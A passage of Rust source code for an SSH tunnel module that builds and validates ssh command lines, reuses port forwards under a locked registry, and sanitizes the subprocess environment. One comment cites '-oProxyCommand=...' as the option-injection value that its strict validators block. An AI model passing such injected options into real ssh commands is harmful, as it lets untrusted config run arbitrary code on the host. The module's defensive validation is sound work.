//! SSH tunnel: shell out to the system `ssh` to open a local port forward to a
//! database behind a bastion (DESIGN §2). Pure command-building lives here
//! (`parse_host`, `ssh_args`, the validators) and is unit-tested without a
//! network; the imperative shell (`open`: pick a port, spawn `ssh`, map
//! failures) is the only IO. Depends only on std (net/process/fs) — no sqlx,
//! no config.
//!
//! We never speak the SSH protocol ourselves (Д8: no `russh`): the system
//! binary inherits `~/.ssh/config`, keys, agent and `ProxyJump` for free, and
//! `ControlMaster=auto`/`ControlPersist` over a stable `ControlPath` reuse the
//! master between runs so the second `nyet` call pays no handshake (Д9).
//!
//! LIFECYCLE — the forward is a shared, recorded resource, not a per-process one.
//! A `-L` forward opened through a `ControlMaster` is owned by the *master* and
//! outlives its client (verified against a real bastion). nyet used to fight
//! that by removing the forward on `Drop`, which made every call pay two `ssh`
//! spawns (measured: 5.6 ms to open + 4.9 ms to cancel on a warm master; ~118 ms
//! of the same plumbing across a WAN bastion). Now the forward is *kept* and
//! reused by the next run, under one invariant:
//!
//!   **At most one nyet forward per (ssh destination, remote host:port) pair.**
//!   It is recorded in exactly one registry file under the nyet runtime dir
//!   (0700, our uid), which also serializes concurrent runs for that pair; it is
//!   discoverable (`nyet doctor <alias>` shows it) and killable (doctor prints
//!   the exact `ssh -O exit` command).
//!
//! Reuse is only allowed when all three hold — otherwise a fresh forward on a
//! fresh random port (fail closed, i.e. today's behaviour):
//! (1) the registry entry parses AND names this very pair; (2) the local port is
//! *occupied* (a free port means the forward is gone); (3) `ssh -O check`
//! reports the *same master pid* that created it.
//!
//! (3) is the ownership proof, and it is inference, not certainty: a forward
//! disappears only when its master exits or someone runs `-O cancel -L`, so
//! "same master still alive" + "port still taken" means the listener is still
//! ours *unless* that one cancel happened. It is the strongest check available
//! without socket-owner introspection (`ssh` has no "list forwards" command;
//! `lsof`/`/proc` are neither portable nor a dependency we want, and cost more
//! than the whole saving). THE RESIDUAL RISK, stated plainly: after such a
//! cancel the freed ephemeral port can be taken by any ordinary local process
//! — no attacker needed, the kernel hands out that same range — and the next
//! run would adopt it and send the database handshake there. That is why
//! `kill_command` deliberately teaches `-O exit` (which invalidates the pid)
//! instead of `-O cancel`: we do not ship the recipe for the one state our
//! reasoning cannot see through.
//!
//! The port stays *random*, though not as a secret — any local process can list
//! loopback listeners in milliseconds. Random buys two things a derived port
//! would not: nothing can be **pre**-captured (a squatter cannot sit on the port
//! before nyet ever runs, only race the moment it frees), and there is no fixed
//! port to hold hostage as a denial-of-service handle.
//!
//! TTL: none of our own. The forward dies with its master, and the master's life
//! is `ControlPersist` — an OpenSSH mechanism the config owner already sets. A
//! second, nyet-specific timer would need either a daemon (UX-6) or a check that
//! only fires when we run anyway, i.e. exactly when we want the forward alive.
//! `control_persist = "no"` (the human asking for no background master) disables
//! reuse and restores the cancel-on-drop behaviour.
//!
//! Teardown modes:
//!   * master mode + reuse: nothing on `Drop` — the forward stays for the next
//!     run and dies with the master (ControlPersist);
//!   * master mode, reuse off (`reuse_forward = false`, `ControlPersist=no`, or
//!     the master pid could not be read): `ssh -O cancel -L ...` on `Drop`
//!     removes just this forward, leaving the master up;
//!   * standalone (no `ControlPath` available): a plain `ssh -N -L` child owns
//!     the forward, so killing that child on `Drop` removes it.
//!
//! SECURITY: `host`/`remote` come from the config, where `${VAR}` substitution
//! makes them agent-influenced (the threat model treats the environment as
//! agent-controlled). The strict validation below (no leading `-`, a safe
//! character set) is the guard against ssh option injection — a `host` like
//! `-oProxyCommand=...` would otherwise run arbitrary code on the nyet host.
//! `ssh` has no `--` to end options (verified: not in its usage), so validation
//! is the only line of defence and runs both at config parse (fail-fast, exit 3)
//! and here before the argv is built.

use std::fs::{File, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::net::{TcpListener, TcpStream};
use std::num::NonZeroU16;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

/// Keep only the env vars `ssh` legitimately needs; everything else — notably
/// the DB password nyet resolved for this connection, which it holds in memory — is
/// dropped so the ssh subprocess (and any ProxyCommand helper it spawns, or any
/// local reader of /proc/PID/environ) never sees it. ssh needs no DB password.
fn keep_env_key(key: &str) -> bool {
    matches!(
        key,
        "HOME" | "USER" | "LOGNAME" | "PATH" | "SSH_AUTH_SOCK" | "SSH_CONNECTION" | "TERM" | "LANG"
    ) || key.starts_with("LC_")
}

/// A `Command` for `ssh` with a sanitized (allowlisted) environment. Used for
/// every ssh invocation — forward setup and `-O cancel` teardown alike.
fn ssh_command() -> Command {
    let mut cmd = Command::new("ssh");
    cmd.env_clear();
    for (k, v) in std::env::vars_os() {
        if k.to_str().is_some_and(keep_env_key) {
            cmd.env(k, v);
        }
    }
    cmd
}

/// A tunnel failure. Both fields are curated, secret-free text; the cli maps
/// this onto CONNECTION_FAILED (exit 6). `ssh` does not print credentials, so
/// its stderr is safe to surface as diagnostics.
#[derive(Debug)]
pub struct TunnelError {
    pub message: String,
    pub hint: String,
}

/// A live tunnel, held by the cli for the duration of one query. What `Drop`
/// does depends on who owns the forward — see the module lifecycle note. The
/// public fields are facts for `nyet doctor`, never secrets.
pub struct Tunnel {
    /// The loopback port the engine connects to.
    pub local_port: u16,
    /// True when this run adopted a forward left behind by an earlier one
    /// (no `ssh` spawn to set it up).
    pub reused: bool,
    /// Age of the forward in seconds, when it is recorded (i.e. persistent);
    /// `None` when the forward lives and dies with this process.
    pub age_secs: Option<u64>,
    /// The exact command that removes this forward, when it outlives us. `None`
    /// means nothing is left behind, so there is nothing to kill.
    pub kill_command: Option<String>,
    teardown: Teardown,
}

enum Teardown {
    /// The forward is recorded in the registry and stays for the next run; it
    /// dies with its master (ControlPersist).
    Keep,
    /// Persistent-master mode without reuse: remove just this forward, leaving
    /// the master up. Holds the full `ssh -O cancel -L ...` argv.
    Cancel(Vec<String>),
    /// Standalone mode (no master): kill the child that owns the forward.
    Child(Child),
}

impl Drop for Tunnel {
    fn drop(&mut self) {
        // Best-effort: we are tearing down, and a failure here (master already
        // gone, child already dead) changes nothing.
        match &mut self.teardown {
            Teardown::Keep => {}
            Teardown::Cancel(args) => {
                let _ = ssh_command().args(args.iter()).output();
            }
            Teardown::Child(child) => {
                let _ = child.kill();
                let _ = child.wait();
            }
        }
    }
}

/// A parsed `[user@]hostname[:port]`: the canonical ssh destination
/// (`[user@]hostname`, trimmed, port stripped) and the optional port for `-p`.
/// Port is `NonZeroU16` — ssh rejects port 0, so it is a config error.
#[derive(Debug, PartialEq)]
struct HostSpec {
    destination: String,
    port: Option<NonZeroU16>,
}

/// A safe host/user label: non-empty, no leading `-` (option injection), only
/// letters/digits/`.`/`-`/`_`. Deliberately strict (fail closed) — bastion
/// hostnames and usernames live comfortably inside it; exotic characters are
/// rejected rather than passed to `ssh` as a possible option.
fn valid_label(s: &str) -> bool {
    !s.is_empty()
        && !s.starts_with('-')
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_'))
}

fn bad_host(host: &str) -> TunnelError {
    TunnelError {
        message: format!("ssh host \"{host}\" is not a valid [user@]hostname[:port]"),
        hint: "use letters, digits, '.', '-', '_' only, no leading '-'; e.g. \
               deploy@bastion.corp:22. A value starting with '-' or with other \
               characters is rejected to prevent ssh option injection. IPv6 address \
               literals (e.g. [2001:db8::1]) are not supported — use a named host"
            .to_string(),
    }
}

/// Parse and validate `host` as `[user@]hostname[:port]`. ssh does not accept
/// `host:port` as a positional argument, so a `:port` suffix becomes a separate
/// `-p`. Rejects anything that could be read as an ssh option (see module docs).
fn parse_host(host: &str) -> Result<HostSpec, TunnelError> {
    let host = host.trim();
    let (user, hostport) = match host.split_once('@') {
        Some((u, rest)) => (Some(u), rest),
        None => (None, host),
    };
    let (hostname, port) = match hostport.rsplit_once(':') {
        // NonZeroU16 parse also rejects port 0 (ssh refuses it).
        Some((h, p)) => {
            let port = p.parse::<NonZeroU16>().map_err(|_| bad_host(host))?;
            (h, Some(port))
        }
        None => (hostport, None),
    };
    if !valid_label(hostname) {
        return Err(bad_host(host));
    }
    if let Some(u) = user {
        if !valid_label(u) {
            return Err(bad_host(host));
        }
    }
    let destination = match user {
        Some(u) => format!("{u}@{hostname}"),
        None => hostname.to_string(),
    };
    Ok(HostSpec { destination, port })
}

/// Parse and validate `remote` as `host:port`, returning the canonical
/// (trimmed) `host:port` that goes verbatim into `-L 127.0.0.1:<lp>:<remote>`.
/// Rejects unsafe characters / a leading `-` and requires a non-zero port —
/// fail closed. Returning the canonical string (not the raw input) is what keeps
/// validation and execution from drifting (e.g. a trailing space that passes a
/// trim-then-validate but breaks the untrimmed `-L`).
fn parse_remote(remote: &str) -> Result<String, TunnelError> {
    let bad = || TunnelError {
        message: format!("ssh remote \"{remote}\" is not a valid host:port"),
        hint: "write remote as host:port with a non-zero numeric port and safe host \
               characters, e.g. db.internal:5432. IPv6 address literals are not \
               supported — use a named host"
            .to_string(),
    };
    let (host, port) = remote.trim().rsplit_once(':').ok_or_else(bad)?;
    let port: NonZeroU16 = port.parse().map_err(|_| bad())?;
    if !valid_label(host) {
        return Err(bad());
    }
    Ok(format!("{host}:{port}"))
}

/// Parse a `control_persist` value with OpenSSH's `ControlPersist` grammar:
/// `yes`/`no`, or a time — bare seconds (`900`) or number+unit tokens from
/// s/m/h/d/w, possibly combined (`2h30m`). Returns the canonical trimmed value.
/// Rejects junk like `s1`/`fifteen`/`15x` at config parse (exit 3).
fn parse_control_persist(value: &str) -> Result<String, TunnelError> {
    let v = value.trim();
    let lower = v.to_ascii_lowercase();
    if lower == "yes" || lower == "no" || is_ssh_time(v) {
        Ok(v.to_string())
    } else {
        Err(TunnelError {
            message: format!("control_persist \"{value}\" is not a valid ControlPersist value"),
            hint: "use yes/no or a time like 900, 30s, 15m, 1h, or 2h30m".to_string(),
        })
    }
}

/// OpenSSH TIME FORMAT: one or more `<digits>[unit]` tokens, each unit one of
/// s/m/h/d/w. Must start with a digit (so `s1` is rejected) and every run of
/// non-digits must be a single valid unit (so `15x` is rejected).
fn is_ssh_time(s: &str) -> bool {
    let b = s.as_bytes();
    if b.is_empty() {
        return false;
    }
    let mut i = 0;
    while i < b.len() {
        let start = i;
        while i < b.len() && b[i].is_ascii_digit() {
            i += 1;
        }
        if i == start {
            return false; // expected digits (start, or after a unit) — got none
        }
        if i < b.len() {
            if !matches!(b[i].to_ascii_lowercase(), b's' | b'm' | b'h' | b'd' | b'w') {
                return false;
            }
            i += 1;
        }
    }
    true
}

/// Config-parse validation (returns a plain message for `ConfigError`). These
/// are the exact parsers `open` uses, run early so a bad value fails fast
/// (exit 3) instead of surfacing as a runtime tunnel error.
pub fn validate_host(host: &str) -> Result<(), String> {
    parse_host(host).map(|_| ()).map_err(|e| e.message)
}
pub fn validate_remote(remote: &str) -> Result<(), String> {
    parse_remote(remote).map(|_| ()).map_err(|e| e.message)
}
pub fn validate_control_persist(value: &str) -> Result<(), String> {
    parse_control_persist(value)
        .map(|_| ())
        .map_err(|e| e.message)
}

/// Build the `ssh` argument vector for a local forward. Pure: the caller
/// supplies the already-validated inputs and the chosen local port. `background`
/// adds `-f` (fork after the forward is up, so a successful exit means ready) —
/// used only in master mode; standalone mode keeps the process in the foreground
/// as a child. Hardening: `BatchMode=yes` fails fast instead of prompting for a
/// password (key/agent auth only); `ExitOnForwardFailure=yes` exits non-zero if
/// the forward failed; `ConnectTimeout` bounds a blackholed bastion (BatchMode
/// does not cover the TCP connect); `ControlMaster=auto` + `ControlPath` enable
/// master reuse. `ServerAlive*` bounds the *other* death — a master whose TCP
/// connection died silently (laptop suspend, NAT timeout, network drop) keeps
/// its local listener up and would otherwise swallow queries until the kernel
/// gives up (hours). With keepalives the master exits in ~45 s, the port frees,
/// and the next run creates a fresh forward instead of reusing a black hole.
fn ssh_args(
    spec: &HostSpec,
    remote: &str,
    control_persist: &str,
    control_path: Option<&str>,
    connect_timeout_secs: u64,
    local_port: u16,
    background: bool,
) -> Vec<String> {
    let mut args = Vec::new();
    if background {
        args.push("-f".to_string());
    }
    args.extend([
        "-N".to_string(),
        "-L".to_string(),
        format!("127.0.0.1:{local_port}:{remote}"),
        "-o".to_string(),
        "ControlMaster=auto".to_string(),
        "-o".to_string(),
        format!("ControlPersist={control_persist}"),
        "-o".to_string(),
        "ExitOnForwardFailure=yes".to_string(),
        "-o".to_string(),
        "BatchMode=yes".to_string(),
        "-o".to_string(),
        format!("ConnectTimeout={connect_timeout_secs}"),
        "-o".to_string(),
        "ServerAliveInterval=15".to_string(),
        "-o".to_string(),
        "ServerAliveCountMax=3".to_string(),
    ]);
    // Always emit ControlPath explicitly. With a path (per-destination via the
    // %C hash) the master persists and the next run reuses it. Without one, emit
    // `none` — NOT omit — so a `~/.ssh/config` `Host *` ControlPath (possibly
    // overlong/stale) can't sneak in and break ssh; `none` deterministically
    // disables multiplexing (standalone mode).
    args.push("-o".to_string());
    args.push(format!("ControlPath={}", control_path.unwrap_or("none")));
    // ssh rejects host:port in the positional argument; a port is passed as -p.
    if let Some(port) = spec.port {
        args.push("-p".to_string());
        args.push(port.to_string());
    }
    // Destination must come last (after all options); validation guarantees it
    // cannot start with '-'.
    args.push(spec.destination.clone());
    args
}

/// The `ssh -O cancel -L ...` argv that removes exactly this forward from the
/// persistent master, leaving the master up for reuse.
fn cancel_args(spec: &HostSpec, remote: &str, control_path: &str, local_port: u16) -> Vec<String> {
    let mut args = vec![
        "-O".to_string(),
        "cancel".to_string(),
        "-L".to_string(),
        format!("127.0.0.1:{local_port}:{remote}"),
        "-o".to_string(),
        format!("ControlPath={control_path}"),
    ];
    if let Some(port) = spec.port {
        args.push("-p".to_string());
        args.push(port.to_string());
    }
    args.push(spec.destination.clone());
    args
}

/// The `ssh -O check` argv: ask the master on this `ControlPath` whether it is
/// alive, and (from its reply) *which* master it is. No network — it is a
/// round-trip over the local mux socket (measured 3.2 ms).
fn check_args(spec: &HostSpec, control_path: &str) -> Vec<String> {
    let mut args = vec![
        "-O".to_string(),
        "check".to_string(),
        "-o".to_string(),
        format!("ControlPath={control_path}"),
    ];
    if let Some(port) = spec.port {
        args.push("-p".to_string());
        args.push(port.to_string());
    }
    args.push(spec.destination.clone());
    args
}

/// The copy-pasteable cleanup command for a human (doctor prints it): shut the
/// master down, which takes every forward it holds with it.
///
/// Deliberately `-O exit` and NOT the surgical `-O cancel`. Adoption trusts
/// "port still occupied + same master pid"; a forward removed while its master
/// lives is the one state where that reasoning breaks (the freed ephemeral port
/// can be re-taken by any local process, and the next run would adopt it). We
/// must not be the ones teaching the command that produces that state — with
/// `-O exit` the pid changes, so nothing is ever adopted afterwards.
///
/// Quoting is minimal-but-correct: everything that is not obviously shell-safe
/// is single quoted, because the `ControlPath` can carry a HOME with a space.
fn kill_command(spec: &HostSpec, control_path: &str) -> String {
    let mut out = String::from("ssh");
    for arg in exit_args(spec, control_path) {
        out.push(' ');
        out.push_str(&shell_quote(&arg));
    }
    out
}

/// The `ssh -O exit` argv: shut down the master on this `ControlPath`.
fn exit_args(spec: &HostSpec, control_path: &str) -> Vec<String> {
    let mut args = vec![
        "-O".to_string(),
        "exit".to_string(),
        "-o".to_string(),
        format!("ControlPath={control_path}"),
    ];
    if let Some(port) = spec.port {
        args.push("-p".to_string());
        args.push(port.to_string());
    }
    args.push(spec.destination.clone());
    args
}

fn shell_quote(arg: &str) -> String {
    let safe = !arg.is_empty()
        && arg.bytes().all(|b| {
            b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b'/' | b':' | b'@' | b'=')
        });
    if safe {
        arg.to_string()
    } else {
        format!("'{}'", arg.replace('\'', "'\\''"))
    }
}

/// The registry record of the forward nyet left running for one (destination,
/// remote) pair. Deliberately a plain `key=value` text file: the last-resort
/// discovery tool is `cat`, and this module owes nothing to serde (Д2).
#[derive(Debug, PartialEq)]
struct Entry {
    /// The loopback port the forward listens on.
    port: u16,
    /// pid of the ControlMaster that owns the forward (from `ssh -O check`).
    /// The ownership proof: a different pid means a different master, which
    /// cannot be holding the forward this entry describes.
    master_pid: u32,
    /// Unix seconds at creation — only reported (age), never trusted.
    created: u64,
    /// The pair this entry belongs to, re-checked on read so a sanitized
    /// file-name collision cannot hand us someone else's forward.
    dest: String,
    ssh_port: u16,
    remote: String,
}

fn render_entry(e: &Entry) -> String {
    format!(
        "v=1\nport={}\npid={}\ncreated={}\ndest={}\nsshport={}\nremote={}\n",
        e.port, e.master_pid, e.created, e.dest, e.ssh_port, e.remote
    )
}

/// Parse a registry file. Any deviation (truncated write, future version,
/// garbage) returns None, which means "do not reuse" — fail closed.
fn parse_entry(text: &str) -> Option<Entry> {
    let (mut port, mut pid, mut created, mut dest, mut ssh_port, mut remote) =
        (None, None, None, None, None, None);
    for line in text.lines().filter(|l| !l.is_empty()) {
        let (key, value) = line.split_once('=')?;
        match key {
            "v" if value != "1" => return None,
            "v" => {}
            "port" => port = Some(value.parse().ok()?),
            "pid" => pid = Some(value.parse().ok()?),
            "created" => created = Some(value.parse().ok()?),
            "dest" => dest = Some(value.to_string()),
            "sshport" => ssh_port = Some(value.parse().ok()?),
            "remote" => remote = Some(value.to_string()),
            _ => return None,
        }
    }
    Some(Entry {
        port: port?,
        master_pid: pid?,
        created: created?,
        dest: dest?,
        ssh_port: ssh_port?,
        remote: remote?,
    })
}

/// One registry slot per pair. `@`/`:` become `_` so the name is a plain
/// filename; the pair is stored *inside* the file as well, so a collision
/// between two sanitized names is caught on read instead of trusted.
fn registry_name(spec: &HostSpec, remote: &str) -> String {
    let clean = |s: &str| s.replace(['@', ':'], "_");
    format!(
        "fwd-{}-{}-{}",
        clean(&spec.destination),
        ssh_port_of(spec),
        clean(remote)
    )
}

fn ssh_port_of(spec: &HostSpec) -> u16 {
    spec.port.map_or(0, |p| p.get())
}

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_secs())
}

/// Open (creating if needed) and lock this pair's registry slot. `None` = run
/// without reuse: no runtime dir, an unusable name, or a slot we could not lock.
/// The file is 0600 in a 0700 directory — that ownership, not the file content,
/// is what makes the record trustworthy.
fn registry_slot(spec: &HostSpec, remote: &str) -> Option<File> {
    let dir = control_dir()?;
    let name = registry_name(spec, remote);
    // Filenames are capped around 255 bytes; a pair that does not fit simply
    // does not get reuse (the tunnel still works).
    if name.len() > 200 {
        return None;
    }
    create_private_dir(&dir).ok()?;
    // The record is only worth trusting because only we can write it. If the
    // directory is group/other-accessible (pre-created by someone else, a
    // hijacked XDG_RUNTIME_DIR, a loose umask), do not reuse — run without it.
    if !is_private_dir(&dir) {
        return None;
    }
    let mut opts = OpenOptions::new();
    opts.read(true).write(true).create(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let file = opts.open(dir.join(name)).ok()?;
    lock_slot(&file).then_some(file)
}

/// Exclusive lock on the slot: two concurrent runs for the same pair must not
/// both create a forward (that is the "at most one" invariant). The wait is
/// bounded — a wedged holder must never hang the CLI; we give up and run without
/// reuse, where the worst case is one extra forward that its master reaps.
fn lock_slot(file: &File) -> bool {
    let deadline = Instant::now() + Duration::from_secs(15);
    loop {
        match file.try_lock() {
            Ok(()) => return true,
            Err(std::fs::TryLockError::WouldBlock) => {}
            // A filesystem that cannot lock (or a real IO error): no reuse.
            Err(std::fs::TryLockError::Error(_)) => return false,
        }
        if Instant::now() >= deadline {
            return false;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

/// Owner-only (`0700`-ish) and not a symlink? Belt to `create_private_dir`'s
/// braces: the directory may already exist with someone else's idea of a mode.
/// Non-unix has no mode bits to check — the registry is a unix-shaped feature.
fn is_private_dir(dir: &Path) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        // symlink_metadata: a symlinked runtime dir points somewhere we did not
        // vet, so it is not "ours" no matter what the target's mode says.
        std::fs::symlink_metadata(dir)
            .is_ok_and(|m| m.file_type().is_dir() && m.permissions().mode() & 0o077 == 0)
    }
    #[cfg(not(unix))]
    {
        dir.is_dir()
    }
}

fn create_private_dir(dir: &Path) -> std::io::Result<()> {
    let mut builder = std::fs::DirBuilder::new();
    builder.recursive(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        builder.mode(0o700);
    }
    builder.create(dir)
}

/// Is nothing listening on this loopback port? A successful bind means the
/// forward that used to be here is gone. Cheap (no spawn, no traffic) and it
/// sends nothing to whoever might be there.
fn port_is_free(port: u16) -> bool {
    TcpListener::bind(("127.0.0.1", port)).is_ok()
}

/// Ask the master on this `ControlPath` for its pid. `None` = no master, or a
/// reply we could not read — both mean "cannot prove ownership", so no reuse.
fn master_pid(spec: &HostSpec, control_path: &str) -> Option<u32> {
    let out = ssh_command()
        .args(check_args(spec, control_path))
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    // OpenSSH prints "Master running (pid=12345)" — on stderr, but read both so
    // the check does not depend on which stream a build chose.
    parse_master_pid(&String::from_utf8_lossy(&out.stderr))
        .or_else(|| parse_master_pid(&String::from_utf8_lossy(&out.stdout)))
}

fn parse_master_pid(text: &str) -> Option<u32> {
    let digits: String = text
        .split("pid=")
        .nth(1)?
        .chars()
        .take_while(char::is_ascii_digit)
        .collect();
    digits.parse().ok()
}

/// Open — or adopt — a local SSH forward and return a `Tunnel` guard. The engine
/// connects to `127.0.0.1:<tunnel.local_port>`. `host`/`remote` are the config
/// values (validated at config parse and re-checked here); `timeout_secs` is the
/// per-query timeout, used to bound the connect; `reuse_forward` is the config
/// owner's opt-out from keeping the forward between runs.
pub fn open(
    host: &str,
    remote: &str,
    control_persist: &str,
    timeout_secs: u64,
    reuse_forward: bool,
) -> Result<Tunnel, TunnelError> {
    // Parse everything to its canonical form ONCE, then build argv only from the
    // parsed values — validation and execution can't drift.
    let spec = parse_host(host)?;
    let remote = parse_remote(remote)?;
    let control_persist = parse_control_persist(control_persist)?;
    // Bound the connect so a blackholed bastion fails fast (min 1s; cap 10s so a
    // huge per-query timeout does not let the tunnel hang for minutes).
    let connect_timeout = timeout_secs.clamp(1, 10);
    match control_path() {
        // Master mode: `-f` attaches the forward to the (reusable) master, which
        // owns it and can keep it for the next run.
        Some(cp) => {
            let reuse = reuse_allowed(reuse_forward, &control_persist);
            open_via_master(
                &spec,
                &remote,
                &control_persist,
                &cp,
                connect_timeout,
                host,
                reuse,
            )
        }
        // Standalone mode: no master to reuse, so a foreground child owns the
        // forward and the guard kills it on drop.
        None => open_standalone(
            &spec,
            &remote,
            &control_persist,
            connect_timeout,
            free_local_port()?,
            host,
        ),
    }
}

/// May the forward be kept for the next run? A kept forward has no TTL of its
/// own — it dies with its master — so `ControlPersist=no`, the human asking for
/// no background master, must not leave one behind either (with `-N` that master
/// would never exit, and the forward would outlive everything). Pure: the one
/// place the two settings meet.
fn reuse_allowed(reuse_forward: bool, control_persist: &str) -> bool {
    reuse_forward && !control_persist.eq_ignore_ascii_case("no")
}

fn open_via_master(
    spec: &HostSpec,
    remote: &str,
    control_persist: &str,
    control_path: &str,
    connect_timeout: u64,
    host: &str,
    reuse: bool,
) -> Result<Tunnel, TunnelError> {
    // The registry slot is held (locked) for the whole create-or-adopt window:
    // a concurrent run for the same pair waits and then adopts what we made.
    let mut slot = reuse.then(|| registry_slot(spec, remote)).flatten();
    if let Some(file) = slot.as_mut() {
        if let Some(tunnel) = try_reuse(file, spec, remote, control_path) {
            return Ok(tunnel);
        }
    }
    let local_port = free_local_port()?;
    let args = ssh_args(
        spec,
        remote,
        control_persist,
        Some(control_path),
        connect_timeout,
        local_port,
        true, // -f: exits 0 once the forward is established
    );
    let output = ssh_command().args(&args).output().map_err(spawn_error)?;
    if !output.status.success() {
        return Err(ssh_failed(host, &String::from_utf8_lossy(&output.stderr)));
    }
    // Record the forward so the next run can adopt it — but only if we can name
    // the master that owns it. Without that pid the next run could not tell our
    // forward from any other listener, so keeping it would be a liability: tear
    // it down on drop instead (the pre-reuse behaviour).
    if let Some(file) = slot.as_mut() {
        if let Some(master_pid) = master_pid(spec, control_path) {
            let entry = Entry {
                port: local_port,
                master_pid,
                created: now_secs(),
                dest: spec.destination.clone(),
                ssh_port: ssh_port_of(spec),
                remote: remote.to_string(),
            };
            if write_entry(file, &entry).is_ok() {
                return Ok(Tunnel {
                    local_port,
                    reused: false,
                    age_secs: Some(0),
                    kill_command: Some(kill_command(spec, control_path)),
                    teardown: Teardown::Keep,
                });
            }
        }
    }
    Ok(Tunnel {
        local_port,
        reused: false,
        age_secs: None,
        kill_command: None,
        teardown: Teardown::Cancel(cancel_args(spec, remote, control_path, local_port)),
    })
}

/// Adopt the forward recorded for this pair, if it is provably still ours (the
/// three conditions in the module lifecycle note). Anything unclear returns
/// None: the caller then opens a fresh forward on a fresh random port.
fn try_reuse(file: &mut File, spec: &HostSpec, remote: &str, control_path: &str) -> Option<Tunnel> {
    let mut text = String::new();
    file.read_to_string(&mut text).ok()?;
    let entry = parse_entry(&text)?;
    // The record must describe *this* pair, whatever the file name says.
    if entry.dest != spec.destination
        || entry.ssh_port != ssh_port_of(spec)
        || entry.remote != remote
    {
        return None;
    }
    // Cheapest first, and it needs no spawn: a free port means the forward died.
    if port_is_free(entry.port) {
        return None;
    }
    // Someone holds the port. Only "the same master that opened it is still
    // alive" makes that someone provably our forward — credentials go nowhere
    // until this matches.
    if master_pid(spec, control_path)? != entry.master_pid {
        return None;
    }
    Some(Tunnel {
        local_port: entry.port,
        reused: true,
        age_secs: Some(now_secs().saturating_sub(entry.created)),
        kill_command: Some(kill_command(spec, control_path)),
        teardown: Teardown::Keep,
    })
}

/// Rewrite the slot in place (we hold its lock). In place, not rename-over: a
/// rename would swap the inode out from under a waiting run's lock.
fn write_entry(file: &mut File, entry: &Entry) -> std::io::Result<()> {
    file.seek(SeekFrom::Start(0))?;
    file.set_len(0)?;
    file.write_all(render_entry(entry).as_bytes())
}

fn open_standalone(
    spec: &HostSpec,
    remote: &str,
    control_persist: &str,
    connect_timeout: u64,
    local_port: u16,
    host: &str,
) -> Result<Tunnel, TunnelError> {
    let args = ssh_args(
        spec,
        remote,
        control_persist,
        None,
        connect_timeout,
        local_port,
        false, // foreground child; readiness is polled below
    );
    let mut child = ssh_command()
        .args(&args)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(spawn_error)?;

    // Ready when the local listener accepts a connection; bounded by the connect
    // timeout (+1s slack). If ssh exits first (auth/forward failure), surface it.
    let deadline = Instant::now() + Duration::from_secs(connect_timeout + 1);
    loop {
        if TcpStream::connect_timeout(
            &([127, 0, 0, 1], local_port).into(),
            Duration::from_millis(100),
        )
        .is_ok()
        {
            return Ok(Tunnel {
                local_port,
                reused: false,
                age_secs: None,
                kill_command: None,
                teardown: Teardown::Child(child),
            });
        }
        if let Ok(Some(_status)) = child.try_wait() {
            let mut stderr = String::new();
            if let Some(mut s) = child.stderr.take() {
                let _ = s.read_to_string(&mut stderr);
            }
            return Err(ssh_failed(host, &stderr));
        }
        if Instant::now() >= deadline {
            let _ = child.kill();
            let _ = child.wait();
            return Err(ssh_failed(
                host,
                "timed out waiting for the SSH forward to become ready",
            ));
        }
        std::thread::sleep(Duration::from_millis(50));
    }
}

fn spawn_error(e: std::io::Error) -> TunnelError {
    if e.kind() == std::io::ErrorKind::NotFound {
        TunnelError {
            message: "the `ssh` binary was not found on PATH".to_string(),
            hint: "install an OpenSSH client (ssh) and ensure it is on PATH; \
                   nyet shells out to the system ssh for tunnels"
                .to_string(),
        }
    } else {
        TunnelError {
            message: format!("failed to run ssh: {e}"),
            hint: "check that the system ssh client is installed and executable".to_string(),
        }
    }
}

fn ssh_failed(host: &str, stderr: &str) -> TunnelError {
    let detail = stderr.trim();
    let detail = if detail.is_empty() {
        "ssh did not establish the forward".to_string()
    } else {
        detail.to_string()
    };
    TunnelError {
        message: format!("could not open the SSH tunnel to \"{host}\": {detail}"),
        hint: "check that the bastion is reachable and that key/agent auth works \
               non-interactively (nyet uses BatchMode: no password prompt). On a first \
               connection add the bastion's key to known_hosts (connect once by hand) — \
               nyet does not auto-accept host keys. Try the same `ssh -N -L ...` yourself; \
               ProxyJump and keys come from ~/.ssh/config"
            .to_string(),
    }
}

/// A stable per-destination `ControlPath` under a runtime dir, so a background
/// master survives between `nyet` invocations and the next run reuses it. `%C`
/// (ssh's hash of localhost/remotehost/port/user) keys one socket per
/// destination. Returns None if no writable dir is available (reuse then just
/// does not happen — the tunnel still works).
fn control_path() -> Option<String> {
    let dir = control_dir()?;
    let path = dir.join("cm-%C");
    // A too-long path makes ssh error ("ControlPath too long", limit ~104/108).
    // Degrade to no-reuse rather than fail the whole tunnel.
    if control_path_too_long(&path) {
        return None;
    }
    create_private_dir(&dir).ok()?;
    Some(path.to_string_lossy().into_owned())
}

/// `%C` (2 chars in the literal) expands to ssh's ~40-char connection hash; the
/// resulting unix-socket path must stay under the OS limit (macOS 104 / Linux
/// 108). Conservative cap at 100 with margin. Pure — unit-tested.
fn control_path_too_long(path: &std::path::Path) -> bool {
    path.as_os_str().len().saturating_sub(2) + 40 >= 100
}

fn control_dir() -> Option<PathBuf> {
    if let Some(x) = std::env::var_os("XDG_RUNTIME_DIR").filter(|v| !v.is_empty()) {
        return Some(PathBuf::from(x).join("nyet"));
    }
    let home = std::env::var_os("HOME").filter(|h| !h.is_empty())?;
    Some(PathBuf::from(home).join(".ssh/nyet"))
}

/// Grab a free TCP port by binding 127.0.0.1:0 and reading the assigned port,
/// then release it for ssh to bind.
///
/// The port stays *random* on purpose — not for secrecy (any local process can
/// enumerate loopback listeners), but because a port derived from the pair could
